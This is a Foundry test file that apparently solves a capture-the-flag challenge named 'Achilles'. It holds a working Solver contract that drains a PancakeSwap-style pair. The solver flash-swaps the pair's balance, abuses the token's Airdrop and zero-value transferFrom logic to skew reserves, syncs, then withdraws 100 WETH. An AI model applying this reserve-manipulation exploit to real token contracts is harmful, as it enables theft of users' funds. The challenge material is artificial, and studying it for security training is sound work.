// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {SetUp} from "../src/Achilles/SetUp.sol";
import {Achilles} from "../src/Achilles/Achilles.sol";
import {PancakePair, IPancakeCallee} from "../src/Achilles/PancakeSwap.sol";
import {WETH} from "../src/Achilles/WETH.sol";

contract AchillesTest is Test {
    SetUp public _setUp;
    Solver public solver;

    function setUp() external {
        _setUp = new SetUp();
        solver = new Solver();

        vm.roll(18189701); // Simulate ETH block.number
    }

    function test_hackAchilles() public {
        solver.solve(_setUp);
        assertTrue(_setUp.isSolved());
    }
}

contract Solver is IPancakeCallee {
    bytes1 private constant START = hex"aa";
    uint256 private START_PAIR_BALANCE = 1000 ether;

    Achilles private achilles;
    PancakePair private pair;

    function solve(SetUp setUp) external {
        achilles = setUp.achilles();
        pair = setUp.pair(); // token0 = achilles

        pair.swap(START_PAIR_BALANCE - 1, 0, address(this), hex"aa"); // Get full pair balance - 1, to imbalance ratio in  Achilles

        getAirdropToken(address(pair)); // Set Achilles reserve in pair
        pair.sync();

        pair.swap(0, 100 ether, address(this), hex"ff"); // Get desired tokens to solve the level
        setUp.weth().transfer(msg.sender, 100 ether); // Transfer tokens to

        selfdestruct(payable(msg.sender));
    }

    function pancakeCall(address, /* sender */ uint256 amount0, uint256, /* amount1 */ bytes calldata data) external {
        if (msg.sender != address(pair)) {
            revert("???");
        }

        uint256 airdropAmount = 1;

        if (START == data[0]) {
            achilles.Airdrop(airdropAmount); // Set airdropAmount to 1
            achilles.transfer(msg.sender, amount0); // Return requested tokens to pair

            getAirdropToken(address(this)); // Get airdrop tokens to bank
        } else {
            achilles.transfer(msg.sender, airdropAmount);
        }
    }

    function getAirdropToken(address to) private {
        address vanishingAddress;
        assembly {
            vanishingAddress := or(address(), number()) // to avoid: address(uint160((uint160(address(this)) | block.number)))
        }
        achilles.transferFrom(vanishingAddress, to, 0);
    }
}
